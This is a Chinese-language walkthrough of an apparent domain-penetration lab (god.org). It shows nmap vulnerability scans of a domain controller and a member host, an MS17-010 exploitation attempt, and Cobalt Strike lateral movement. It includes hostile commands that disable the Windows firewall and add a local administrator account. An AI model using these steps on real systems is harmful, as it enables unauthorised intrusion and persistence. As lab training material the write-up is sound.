![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678880098093-c11c5d3a-6125-4c17-ba79-58d614bf3580.png#averageHue=%23282e3d&clientId=u2d9cfd07-d2a6-4&from=paste&height=178&id=uf0198413&name=image.png&originHeight=223&originWidth=632&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=98383&status=done&style=none&taskId=u3880364e-0faf-4544-9dd1-2aa3c4e359e&title=&width=505.6)

内网存活：138，141两台主机
扫描存在ms17_010
![](https://img2023.cnblogs.com/blog/3089046/202303/3089046-20230317113118041-555995304.png)
使用模块
第一个不成功，第二个
![image](https://img2023.cnblogs.com/blog/3089046/202303/3089046-20230317120638412-844858260.png)

`netsh advfirewall set allprofiles state off`  关闭防火墙
通过ping信息收集中知道的：
该域名为god.org，域控为OWA$，域管理员为Administrator，内网网段为192.168.52.1/24，我们用Ping命令探测域控的ip
![image](https://img2023.cnblogs.com/blog/3089046/202303/3089046-20230317161242491-1825805818.png)
确定域控ip192.168.52.138
在10上创建本地管理员用户，尝试连接域控3389
`net user hello 123!@#qwe /add` 添加一个hello用户
`net localgroup administrators hello /add` 添加到管理组

![image](https://img2023.cnblogs.com/blog/3089046/202303/3089046-20230317162202200-273434626.png)

nmap扫描结果
```shell
Nmap scan report for 192.168.52.138
Host is up (1.1s latency).
Not shown: 981 closed tcp ports (conn-refused)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
| http-vuln-cve2015-1635: 
|   VULNERABLE:
|   Remote Code Execution in HTTP.sys (MS15-034)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2015-1635
|       A remote code execution vulnerability exists in the HTTP protocol stack (HTTP.sys) that is
|       caused when HTTP.sys improperly parses specially crafted HTTP requests. An attacker who
|       successfully exploited this vulnerability could execute arbitrary code in the context of the System account.
|           
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
|_ssl-ccs-injection: No reply from server (TIMEOUT)
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49161/tcp open  unknown

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|_smb-vuln-ms10-061: SMB: Failed to connect to host: Nsock connect failed immediately
|_samba-vuln-cve-2012-1182: SMB: Failed to connect to host: Nsock connect failed immediately
```

使用代理nmap端口扫描（需使用-sT）

```
proxychains nmap --script=vuln 192.168.52.141

PORT     STATE SERVICE
21/tcp   open  ftp  
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
777/tcp  open  multiling-http
1025/tcp open  NFS-or-IIS
1038/tcp open  mtqp
1042/tcp open  afrog
1043/tcp open  boinc
6002/tcp open  X11:2
7001/tcp open  afs3-callback
7002/tcp open  afs3-prserver
8099/tcp open  unknown

Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
|_smb-vuln-ms10-054: false
```

## 六：上线CS

由于已经得到win7的权限，使用cs新建监听器，生成payload连接win7：

![image-20230320121950031](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230320121950031.png)

然后上传至靶机win7,运行得到shell,输入net view,可以在

![image-20230320135312151](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230320135312151.png)

看到目标，右键横向移动，新建SMB监听器得到域成员靶机shell

![image-20230320135436270](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230320135436270.png)

![image-20230320135455919](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230320135455919.png)